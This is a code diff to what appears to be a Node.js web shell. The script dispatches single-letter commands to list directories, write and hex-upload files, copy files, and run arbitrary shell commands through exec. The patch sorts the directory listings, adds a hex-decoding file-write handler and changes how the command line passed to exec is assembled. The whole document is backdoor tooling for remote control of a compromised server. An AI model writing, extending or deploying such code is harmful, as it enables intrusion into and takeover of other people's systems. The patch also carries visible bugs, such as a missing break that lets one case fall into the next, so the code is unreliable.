@@ -36,7 +36,7 @@ var getCurrentDisk = function() {
 }
 
 var nullOrEmpty = function(p) {
-	return !(p !== undefined && p !== null && p !== NaN && p.length !== 0);
+	return p === undefined || p === null || p === NaN || p.length === 0;
 }
 
 var isEmptyObject = function(o) {
@@ -44,6 +44,10 @@ var isEmptyObject = function(o) {
 		return false;
 	}
 	return true;
+}
+
+var sorter = function(a,b){
+	return a.toUpperCase() > b.toUpperCase() ? 1 : -1;
 }
 
 var getDirInfo = function(dir, cb) {
@@ -104,10 +108,17 @@ var main = function(req, res, cb) {
 		case "B":
 			{
 				getDirInfo(getAbsolutePath(Z1), function(data) {
-					Ret = data.d.join('');
-					Ret += data.f.join('');
-					cb(Ret);
-				})
+					Ret = '';
+					if (!nullOrEmpty(data.d)) {
+						data.d.sort(sorter);
+						Ret += data.d.join('');
+					}
+					if (!nullOrEmpty(data.f)) {
+						data.f.sort(sorter);
+						Ret += data.f.join('');
+					}
+					cb(Ret ? Ret : '1');
+				});
 			}
 			break;
 		case "C":
@@ -119,7 +130,6 @@ var main = function(req, res, cb) {
 			}
 			break;
 		case "D":
-		case "G":
 			{
 				writeFile(Z1, Z2, function(data) {
 					cb(Ret);
@@ -143,6 +153,14 @@ var main = function(req, res, cb) {
 				});
 			}
 			break;
+		case "G":
+			{
+				for (var i = 0; i < Z2.length; i += 2) {
+					byteA.push(parseInt(Z2.substr(i, 2), 16));
+				}
+				fs.createWriteStream(Z1).write(new Buffer(byteA));
+				cb(Ret);
+			}
 		case "H":
 			{
 				fs.createReadStream(Z1).pipe(fs.createWriteStream(Z2));
@@ -180,7 +198,7 @@ var main = function(req, res, cb) {
 			break;
 		case "M":
 			{
-				exec(Z1.substr(2) + ' ' + Z1.substr(2) + ' ' + Z2, function(err, out) {
+				exec(strFmt('{1} {2} {3}', Z1.substr(2),Z1.substr(0,2),Z2), function(err, out) {
 					Ret = out;
 					cb(Ret);
 				});
